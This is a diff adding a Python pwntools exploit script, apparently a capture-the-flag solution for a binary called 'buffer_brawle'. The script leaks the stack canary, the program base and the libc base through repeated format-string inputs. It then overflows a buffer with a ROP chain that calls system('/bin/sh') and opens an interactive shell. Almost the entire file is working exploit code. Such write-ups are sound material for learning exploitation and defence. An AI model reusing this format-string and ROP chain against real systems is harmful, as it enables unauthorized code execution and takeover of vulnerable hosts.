@@ -1,0 +1,75 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+exe = ELF("./buffer_brawle")
+libc = ELF("./libc.so.6")
+# context.log_level='debug'
+# p = remote("buffer-brawl.chal.wwctf.com", 1337)
+p = process([exe.path])
+def GDB():
+    context.terminal = ["foot"]
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+# gdbs()
+sla(">","4")
+sla("?","%p")
+p.recvline()
+addr = int(p.recvline(),16) 
+buff = addr
+log.info(f"{hex(buff) = }")
+sla(">","4")
+sla("?","%13$p")
+p.recvline()
+addr = int(p.recvline(),16)
+exe.address = addr - 0x1747
+log.info(f"{hex(exe.address) = }")
+sla(">","4")
+sla("?","%11$p")
+p.recvline()
+addr = int(p.recvline(),16)
+canary = addr
+log.info(f"{hex(canary) = }")
+# for i in range(100):
+sla(">","4")
+# sla("?",f"%2$p")
+sla("?",f"%3$p")
+p.recvline()
+addr = int(p.recvline(),16)
+log.info(f"{hex(addr) = }")
+reads = addr - 17
+log.info(f"{hex(reads) = }")
+
+sla(">","4")
+sla("?",f"%{0x31}$p")
+p.recvline()
+addr = int(p.recvline(),16)
+libc.address = addr - 0x28209
+pop_rdi = libc.address + 0x0000000000028795
+ret = libc.address + 0x0000000000026a3e
+log.info(f"{hex(libc.address) = }")
+for i in range(43):
+    sla(">","2")
+# GDB()
+
+sla(">","1")
+payload = b"a"*(0x28-0x10)+p64(canary)+p64(0) + p64(ret) + p64(pop_rdi) + p64(libc.search("/bin/sh\0").__next__()) + p64(libc.sym.system)
+sla(":", payload)
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
